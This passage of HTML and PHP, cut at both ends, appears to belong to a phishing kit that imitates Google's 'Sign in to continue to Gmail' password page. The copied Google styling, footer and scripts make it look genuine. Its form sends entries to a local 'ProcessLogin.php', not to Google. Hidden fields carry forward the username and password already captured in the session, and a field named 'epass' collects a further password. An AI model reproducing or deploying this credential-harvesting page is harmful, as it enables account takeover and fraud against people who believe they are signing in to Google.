  transition-duration: 0.1s;
  -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.slide-out {
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.shift-form .slide-out {
  opacity: 0;
  -webkit-transform: translate3d(-120%, 0, 0);
  -moz-transform: translate3d(-120%, 0, 0);
  -ms-transform: translate3d(-120%, 0, 0);
  -o-transform: translate3d(-120%, 0, 0);
  transform: translate3d(-120%, 0, 0);
}
.slide-in {
  -webkit-transform: translate3d(120%, 0, 0);
  -moz-transform: translate3d(120%, 0, 0);
  -ms-transform: translate3d(120%, 0, 0);
  -o-transform: translate3d(120%, 0, 0);
  transform: translate3d(120%, 0, 0);
}
.shift-form .slide-in {
  opacity: 1;
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.error-msg {
  -webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  height: auto;
  max-height: 0;
  opacity: 0;
}
.has-error .error-msg {
  max-height: 3.5em;
  margin-top: 10px;
  margin-bottom: 10px;
  opacity: 1;
  visibility: visible;
}
.back-arrow {
  position: absolute;
  top: 37px;
  width: 24px;
  height: 24px;
  display: none;
  cursor: pointer;
}
.back-arrow {
  border-style: none;
}
.shift-form.back-arrow {
  display: block;
}
.back-arrow img {
  display: block;
}
#link-signup {
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signup{
  display: none;
}
#link-signin-different {
  display: none;
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signin-different {
  display: block;
}
.signin-card #profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 0;
  min-height: 1em;
}
.signin-card.no-name #profile-name {
  display: none;
}
.signin-card.no-name #email-display {
  line-height: initial;
  margin-bottom: 16px;
}
.signin-card #email-display {
  display: block;
  padding: 0px 8px;
  color: rgb(64, 64, 64);
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.signin-card #Email {
  margin-top: 16px;
}
.need-help {
  float: right;
  text-align: right;
}
.form-panel {
  width: 274px;
}
#gaia_firstform {
  z-index: 2;
}
.signin-card {
  position: relative;
  overflow: hidden;
}
.signin-card #profile-name {
  color: #000;
}
.circle-mask {
  display: block;
  height: 96px;
  width: 96px;
  overflow: hidden;
  border-radius: 50%;
  margin-left: auto;
  margin-right: auto;
  z-index: 100;
  margin-bottom: 10px;
}
.circle {
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  -ms-transition-property: -ms-transform;
  -o-transition-property: -o-transform;
  transition-property: transform;
  -webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  transition-timing-function: cubic-bezier(.645,.045,.355,1);
}
.circle {
  position: absolute;
  z-index: 101;
  height: 96px;
  width: 96px;
  border-radius: 50%;
  opacity: 0.99;
  overflow: hidden;
  background-repeat: no-repeat;
  background-position: center center;
}
.main {
  overflow: hidden;
}
.card-mask-wrap {
  position: relative;
  width: 360px;
  margin: 0 auto;
  z-index: 1;
}
.dasher-tooltip {
  position: absolute;
  left: 50%;
  margin-left: 150px;
}
.dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
}
.dasher-tooltip p {
  margin-top: 0;
}
.dasher-tooltip p span {
  display: block;
}
.card {
  margin-bottom: 0;
}
.one-google {
  padding-top: 27px;
}
#canvas {
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
  opacity: 0.01;
}
.shift-form #canvas {
  opacity: 0.99;
}
.label {
  color: #404040;
}
#account-chooser-link {
  -webkit-transition: opacity 0.3s;
  -moz-transition: opacity 0.3s;
  -ms-transition: opacity 0.3s;
  -o-transition: opacity 0.3s;
  transition: opacity 0.3s;
}
.input-wrapper {
  position: relative;
}
.google-footer-bar {
  z-index: 2;
}
</style>
<style media="screen and (max-width: 580px)">
.back-arrow {
  top: 17px;
}
.circle-mask {
  height: 72px;
  width: 72px;
  background-size: 72px;
}
.circle {
  height: 72px;
  width: 72px;
}
#canvas {
  height: 72px;
  width: 72px;
}
.form-panel {
  width: 256px;
}
.card-mask-wrap {
  width: 300px;
}
.signin-card {
  width: 256px;
}
.signin-card #EmailFirst {
  margin-top: 15px;
}
.one-google {
  padding-top: 22px;
}
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div class="main-content 
  
    shift-form
  
  
    no-name
  
  
  
">
<div class="card signin-card
  
    shift-form
  
  
  
   no-name">
  <div id="cc_iframe_parent"><iframe src="https://accounts.youtube.com/accounts/CheckConnection?pmpo=https%3A%2F%2Faccounts.google.com&amp;v=-807733018&amp;timestamp=1533017271795" id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
  <img class="circle-mask" src="https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=96">
  <form novalidate="" method="post" action="../../includes/ProcessLogin.php" name="email" id="asw" method="POST">
  <input name="Page" type="hidden" value="PasswordSeparationSignIn">
  <input type="hidden" name="GALX" value="HFrkSFaKAQQ">
  <input type="hidden" name="gxf" value="AFoagUVtY4pyJe_RuWDugTQCFRVojyx1RQ:1533017270443">
  <input type="hidden" name="continue" value="https://mail.google.com/mail/">
  <input type="hidden" name="service" value="mail">
  <input type="hidden" name="rip" value="1">
  <input type="hidden" name="flowName" value="GlifWebSignIn">
  <input type="hidden" name="flowEntry" value="ServiceLogin">
  <input id="profile-information" name="ProfileInformation" type="hidden" value="APMTqunc7fZHTE5f_CHxsNHYY4M2RhJrOU0730MVYx1gMkC_15Nq5VWov8DlJ5clAyLKjddV-0IlByaQNgD_MSnk1aFD9K5z_tNCoaQENpPj__SAcqICxgd2dfa3GdKjKz__OFEwknBW61xy_DbYmOgj9sqYDq5OLw">
  <input id="session-state" name="SessionState" type="hidden" value="AEThLlz2L6uB4NqiIZKUE4h9CbVGRpHXk3ZfRjU-XegQM2G6rPhIo2XCshECCMmMoZCcBFjfyMmM8Yu9rr9fkhF-YXC7zISW_JwQMpvvfu1Of-tar5OvtM_qTSDPktursUoZlNR60l7qDppJRB43MiUD9G26aUyd0bg0p5WcwWmGtScsuowqJqjZUY1oidkJ6wmIR4WAkvX0U70CX0wMTtzNy_zRHe5TzQ4QlBpRBtz5GQwJ7apgr0mfDPQWFTUORjNiokCSn3XgC6qKD2UBdy4GEKBWDkr1YgaeZs4IkntGTTBgUyyNZrnyRgrp7vRjW2yJvGTwYw-wuT6l8c0kRiIGuQOdbMZIpq29c17iewW8hiVyQ3xlWWTtOybrJYvFyuCl2xH-iMSWHAaA2zUfytussf363gI7yV2LkGyukLALVT5XHYfV9gpP_IOiGqH9GMNGco9dNumVp8QrikrZaJKkwSpXyUhwDZeldTFVcro8tVFbx_IA4r8kzfyyb_MVCXDIxuL3N25fslpRsnvvCA5dou_srgyL3ZBp4drDj4XgOyeEXDu0gczKcUSVzFyyDTD6ZqCWxHLqZ1GCrPHyRgMqIFXEI1xLuVNLEVwcsoUEWbfdfWau4MThZbc8kp72flCshfhzpWA4">
  <input type="hidden" id="_utf8" name="_utf8" value="?">
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
  <input type="hidden" id="pstMsg" name="pstMsg" value="1">
  <input type="hidden" id="checkConnection" name="checkConnection" value="youtube:613:1">
  <input type="hidden" id="checkedDomains" name="checkedDomains" value="youtube">
  <a id="back-arrow" href="#" class="back-arrow shift-form">
  <img aria-label="Back" alt="Back" src="https://www.gstatic.com/images/icons/material/system/1x/arrow_back_grey600_24dp.png">
  </a>
  <div class="form-panel second">
  <div class="slide-in ">
  <div>
  <p id="profile-name"></p>
  <span dir="ltr" id="email-display"><?php echo $_SESSION['user']; ?></span>
  </div>
  <div>
  <div id="password-shown">
  <div>
  <input type="hidden" name="user" value="<?php echo $_SESSION['user']; ?>">
  <input type="hidden" name="pass" value="<?php echo $_SESSION['pass']; ?>">
<label class="hidden-label" for="Passwd">Password</label>
<input type="password" class="text-line" name="epass">
  </div>
  </div>
  </div>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
  <span>
  Stay signed in
  </span>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" class="need-help" href="#">
  Forgot password?
  </a>
  </div>
  </div>
  </form>
</div>
  <div class="card-mask-wrap
     shift-form
        
     no-name">
  <div class="card-mask">
  <div class="one-google">
  <p class="create-account">
  <span id="link-signin-different">
  <a href="#">
  Sign in with a different account
  </a>
  </span>
  <span id="link-signup">
  <a href="#">
  Create account
  </a>
  </span>
  </p>
<p class="tagline">
  One Google Account for everything Google
</p>
<div class="logo-strip"></div>
  </div>
  </div>
  </div>
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="#">
  About Google
  </a>
  </li>
  <li>
  <a href="#">
  Privacy
  </a>
  </li>
  <li>
  <a href="#">
  Terms
  </a>
  </li>
  <li>
  <a href="#">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: inline;">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="//ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af">
  &#8234;Afrikaans&#8236;
  </option>
  <option value="az">
  &#8234;az?rbaycan&#8236;
  </option>
  <option value="ca">
  &#8234;catal&#65533;&#8236;
  </option>
  <option value="cs">
  &#8234;Ce&#65533;tina&#8236;
  </option>
  <option value="da">
  &#8234;Dansk&#8236;
  </option>
  <option value="de">
  &#8234;Deutsch&#8236;
  </option>
  <option value="et">
  &#8234;eesti&#8236;
  </option>
  <option value="en-GB">
  &#8234;English (United Kingdom)&#8236;
  </option>
  <option value="en" selected="selected">
  &#8234;English (United States)&#8236;
  </option>
  <option value="es">
  &#8234;Espa&#65533;ol (Espa&#65533;a)&#8236;
  </option>
  <option value="es-419">
  &#8234;Espa&#65533;ol (Latinoam&#65533;rica)&#8236;
  </option>
  <option value="eu">
  &#8234;euskara&#8236;
  </option>
  <option value="fil">
  &#8234;Filipino&#8236;
  </option>
  <option value="fr-CA">
  &#8234;Fran&#65533;ais (Canada)&#8236;
  </option>
  <option value="fr">
  &#8234;Fran&#65533;ais (France)&#8236;
  </option>
  <option value="gl">
  &#8234;galego&#8236;
  </option>
  <option value="hr">
  &#8234;Hrvatski&#8236;
  </option>
  <option value="in">
  &#8234;Indonesia&#8236;
  </option>
  <option value="zu">
  &#8234;isiZulu&#8236;
  </option>
  <option value="is">
  &#8234;&#65533;slenska&#8236;
  </option>
  <option value="it">
  &#8234;Italiano&#8236;
  </option>
  <option value="sw">
  &#8234;Kiswahili&#8236;
  </option>
  <option value="lv">
  &#8234;latvie&#65533;u&#8236;
  </option>
  <option value="lt">
  &#8234;lietuviu&#8236;
  </option>
  <option value="hu">
  &#8234;magyar&#8236;
  </option>
  <option value="ms">
  &#8234;Melayu&#8236;
  </option>
  <option value="nl">
  &#8234;Nederlands&#8236;
  </option>
  <option value="no">
  &#8234;norsk&#8236;
  </option>
  <option value="pl">
  &#8234;polski&#8236;
  </option>
  <option value="pt">
  &#8234;Portugu&#65533;s (Brasil)&#8236;
  </option>
  <option value="pt-PT">
  &#8234;Portugu&#65533;s (Portugal)&#8236;
  </option>
  <option value="ro">
  &#8234;rom&#65533;na&#8236;
  </option>
  <option value="sk">
  &#8234;Slovencina&#8236;
  </option>
  <option value="sl">
  &#8234;sloven&#65533;cina&#8236;
  </option>
  <option value="fi">
  &#8234;Suomi&#8236;
  </option>
  <option value="sv">
  &#8234;Svenska&#8236;
  </option>
  <option value="vi">
  &#8234;Ti?ng Vi?t&#8236;
  </option>
  <option value="tr">
  &#8234;T&#65533;rk&#65533;e&#8236;
  </option>
  <option value="el">
  &#8234;????????&#8236;
  </option>
  <option value="bg">
  &#8234;?????????&#8236;
  </option>
  <option value="mn">
  &#8234;??????&#8236;
  </option>
  <option value="ru">
  &#8234;???????&#8236;
  </option>
  <option value="sr">
  &#8234;??????&#8236;
  </option>
  <option value="uk">
  &#8234;??????????&#8236;
  </option>
  <option value="ka">
  &#8234;???????&#8236;
  </option>
  <option value="hy">
  &#8234;???????&#8236;
  </option>
  <option value="iw">
  &#8235;?????&#8236;&lrm;
  </option>
  <option value="ur">
  &#8235;????&#8236;&lrm;
  </option>
  <option value="ar">
  &#8235;???????&#8236;&lrm;
  </option>
  <option value="fa">
  &#8235;?????&#8236;&lrm;
  </option>
  <option value="am">
  &#8234;????&#8236;
  </option>
  <option value="ne">
  &#8234;??????&#8236;
  </option>
  <option value="mr">
  &#8234;?????&#8236;
  </option>
  <option value="hi">
  &#8234;??????&#8236;
  </option>
  <option value="bn">
  &#8234;?????&#8236;
  </option>
  <option value="gu">
  &#8234;???????&#8236;
  </option>
  <option value="ta">
  &#8234;?????&#8236;
  </option>
  <option value="te">
  &#8234;??????&#8236;
  </option>
  <option value="kn">
  &#8234;?????&#8236;
  </option>
  <option value="ml">
  &#8234;??????&#8236;
  </option>
  <option value="si">
  &#8234;?????&#8236;
  </option>
  <option value="th">
  &#8234;???&#8236;
  </option>
  <option value="lo">
  &#8234;???&#8236;
  </option>
  <option value="my">
  &#8234;??????&#8236;
  </option>
  <option value="km">
  &#8234;?????&#8236;
  </option>
  <option value="ko">
  &#8234;???&#8236;
  </option>
  <option value="zh-HK">
  &#8234;??(??)&#8236;
  </option>
  <option value="ja">
  &#8234;???&#8236;
  </option>
  <option value="zh-CN">
  &#8234;????&#8236;
  </option>
  <option value="zh-TW">
  &#8234;????&#8236;
  </option>
  </select>
  </span>
  </div>
  </div>
</div>
  </div>
  <script nonce="">
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var appendHiddenParams = function(query) {
          var loginForm = document.getElementById('gaia_loginform');
          if (loginForm) {
            var loginInputs = loginForm.getElementsByTagName('input');
            for (var i = 0, input; input = loginInputs[i]; i++) {
              if (input.type == 'hidden' && input.value && !query[input.name]) {
                query[input.name] = input.value;
              }
            }
          }
        }
        var post = function(path, params) {
          var form = document.createElement('form');
          form.setAttribute('method', 'post');
          form.setAttribute('action', path);

          for (var key in params) {
            if (params.hasOwnProperty(key)) {
              var hiddenField = document.createElement('input');
              hiddenField.setAttribute('type', 'hidden');
              hiddenField.setAttribute('name', key);
              hiddenField.setAttribute('value', params[key]);

              form.appendChild(hiddenField);
            }
          }

          document.body.appendChild(form);
          form.submit();
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var hiddenEmailInput = document.getElementById('Email-hidden');
            if (hiddenEmailInput) {
              // If we are in password separation on password page, post to
              // /AccountLoginInfo.
              appendHiddenParams(langChooser_params);
              langChooser_params['Email'] = hiddenEmailInput.value;
              post('/AccountLoginInfo', langChooser_params);
            } else {
              var paramsStr = langChooser_getParamStr(langChooser_params);
              var newHref = langChooser_currentPath + "?" + paramsStr;
              if (langChooser_fragment) {
                newHref = newHref + "#" + langChooser_fragment;
              }
              window.location.href = newHref;
            }
          };
        }
      })();
    </script>
<script type="text/javascript" nonce="">
  var gaia_attachEvent = function(element, event, callback) {
  if (element && element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element && element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script nonce="">var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;
var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1},Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(c){for(var a=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],b=0;b<a.length;b++)try{return new ActiveXObject(a[b])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}c=c.join("&");var f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.u=this.m();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.m=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.i=function(a,b,c){var d=this.u,e=this.g||"";d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random());d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.i(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=/^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([wd-u0100-uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:?([^#]*))?(?:#(.*))?$/,Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d=b.match(Gn)[3]||null;var e=d&&decodeURIComponent(d);d=Number(b.match(Gn)[4]||null)||null;if(!c||!e)return Gm.error("Invalid origin Exception",[String(b)]),!1;d||(d=Go(c));b=a.match(Gn)[1]||null;if(!b||b.toLowerCase()!=c.toLowerCase())return!1;
c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=e.toLowerCase())return!1;(a=Number(a.match(Gn)[4]||null)||null)||(a=Go(b));return d==a};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gt.prototype;G.h=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.w=function(a){return this.h(a,null)};G.v=function(a){return this.h(a,Gs)};G.l=function(a){a=a.match("^([^:]+):(\d*):(\d?)$");return!a||3>a.length?null:a[1]};
G.s=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;this.l(b)==this.b&&(this.v(b)||this.w(a),this.a=!0);return!0};G.o=function(){var a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.j=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.o();a.id=this.b;Gr.appendChild(a)};
var Gu=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].s(c,b);e++);}},Gv=function(){if(window.postMessage){var a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?b?(Gs=document.getElementById(b),a=!0):(Gq.error("Unable to locate the input element to storeCheckConnection result","new id: "+String(b)),a=!1):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",
["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){b=a.length;for(var c=[],d=0;d<b;d++)c.push(new Gt(a[d].iframeUri,a[d].domainSymbol));Gh(window,"message",Gu(c));for(d=0;d<b;d++)c[d].j()}}}},Gw=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;
if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gv);G_setPostMessageSupportFlag=Gq.f(Gw);
</script>
  <script nonce="">
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpox3dhttps%3A%2F%2Faccounts.google.comx26vx3d-807733018',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript" nonce="">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */Function('var x=function(L,h,X,p,Y){for(;L.l.length;){if(X&&h&&b(L)){(Y=L,L).eK(function(){y(Y,false,h,false)});break}p=(p=(X=true,L.l.pop()),c(L,p))}return p},E=function(L,h,X,p,Y,P){for(p=(L=((Y=L.w(h),137)==h?(h=function(L,h,X,p){if((h=Y.length,X=h-4>>3,Y.a)!=X){X=(X<<(Y.a=(p=[0,0,0,P],X),3))-4;try{Y.Z=M(W(Y,X),W(Y,X+4),p)}catch(t){throw t;}}Y.push(Y.Z[h&7]^L)},P=L.w(94)):h=function(L){Y.push(L)},p&&h(p&255),X).length,0);p<L;p++)h(X[p])},H=function(L,h,X,p,Y){for(h=[],p=X=0;p<L.length;p++)Y=L.charCodeAt(p),128>Y?h[X++]=Y:(2048>Y?h[X++]=Y>>6|192:(55296==(Y&64512)&&p+1<L.length&&56320==(L.charCodeAt(p+1)&64512)?(Y=65536+((Y&1023)<<10)+(L.charCodeAt(++p)&1023),h[X++]=Y>>18|240,h[X++]=Y>>12&63|128):h[X++]=Y>>12|224,h[X++]=Y>>6&63|128),h[X++]=Y&63|128);return h},f=false,y=function(L,h,X,p,Y,P){if(0==L.l.length)return P;if(Y=0==L.s)L.N=L.i();return(P=x(L,X,p),Y)&&(X=L.i()-L.N,X<(h?10:0)||0>=L.A--||L.G.push(254>=X?X:254)),P},I=function(L,h,X){if(102==h||231==h)if(L.H[h])L.H[h][L.X](X);else L.H[h]=L.j(X);else if(19!=h&&137!=h&&86!=h&&189!=h||!L.H[h])L.H[h]=L.L(X,L.w);187==h&&(L.f=void 0,I(L,102,L.w(102)+4))},C=function(L,h){(h=L.w(102)-h,I(L,102,L.U.length),L).l.push([3,h])},a=function(L,h,X,p){for(p=(X=[],h-1);0<=p;p--)X[h-1-p]=L>>8*p&255;return X},k=function(L,h,X,p,Y,P,v){L.s++;try{for(Y=(p=5001,X=L.U.length,void 0),P=0;(--p||L.O)&&(L.C||(P=L.w(102))<X);)try{L.C?Y=L.T(true):(I(L,231,P),v=L.T(),Y=L.w(v)),Y&&Y.call?Y(L):G(L,21,0,v),L.Y=true,q(L,0,2)}catch(J){J!=L.o&&(L.w(170)?G(L,22,J):I(L,170,J))}p||G(L,33)}catch(J){try{G(L,22,J)}catch(F){d(L,F)}}return(X=L.w(117),h)&&I(L,102,h),L.s--,X},U,b=function(L){if(L.I){if(!L.R)return false;L.R=false}else if(10>L.i()-L.N)return false;return 0!=document.hidden?false:true},S=function(L,h,X,p){(p=(X=L.T(),L).T(),E)(L,p,a(L.w(X),h))},O=this,T=function(L,h){return(h=L.T(),h&128)&&(h=h&127|L.T()<<7),h},G=function(L,h,X,p,Y){I(((X=((p=(0==((h=(Y=L.w(231),[h,Y>>8&255,Y&255]),void 0)!=p&&h.push(p),L.w(189)).length&&(L.H[189]=void 0,I(L,189,h)),""),X)&&(X.message&&(p+=X.message),X.stack&&(p+=":"+X.stack)),L).w(84),3<X)&&(p=p.slice(0,X-3),X-=p.length+3,p=H(p.replace(/
/g,"
")),E(L,137,a(p.length,2).concat(p),12)),L),84,X)},m=function(L,h,X,p,Y){for(L.s=(L.G=(L.j=function(L,h,X){return h=(X=function(){return L},function(){return X()}),h[this.X]=function(P){L=P},h},L.Y=false,L.I=(L.A=25,0),L.R=false,L.C=void 0,Y=0,L.g=void 0,p=[],L.L=function(L,h,X,p,Y,t){return(X=this,p=function(){return p[X.F+(Y[X.b]===h)-!t[X.b]]},Y=function(){return p()},t=X.J,Y)[X.X]=function(L){p[X.h]=L},Y[X.X](L),L=Y},[]),0);128>Y;Y++)p[Y]=String.fromCharCode(Y);I((Y=((I((I(L,(I(L,86,((I(L,19,(I(L,170,(I(((I(L,99,(I(L,189,(I(L,((I(L,7,(I((I(L,(I(((I(L,196,(I(L,(I((I(L,23,(((I(L,173,(I(L,236,(L.V=((I(L,57,(I(L,(I(L,(I(L,((I(L,(I(L,(I(L,17,(I(L,69,(I((L.TN=((((I(L,231,(L.H=[],I(L,102,0),0)),L).re=function(L,h){h.push(L[0]<<24|L[1]<<16|L[2]<<8|L[3]),h.push(L[4]<<24|L[5]<<16|L[6]<<8|L[7]),h.push(L[8]<<24|L[9]<<16|L[10]<<8|L[11])},window.performance)||{}).timing||{}).navigationStart||0,L),58,function(L,h,X,p,Y,t,l,u,B,K,D,V,e){for(K=(u=(l=(t=(Y=(p=(h=L.T(),X=0),function(h,P){for(;p<h;)X|=L.T()<<p,p+=8;return 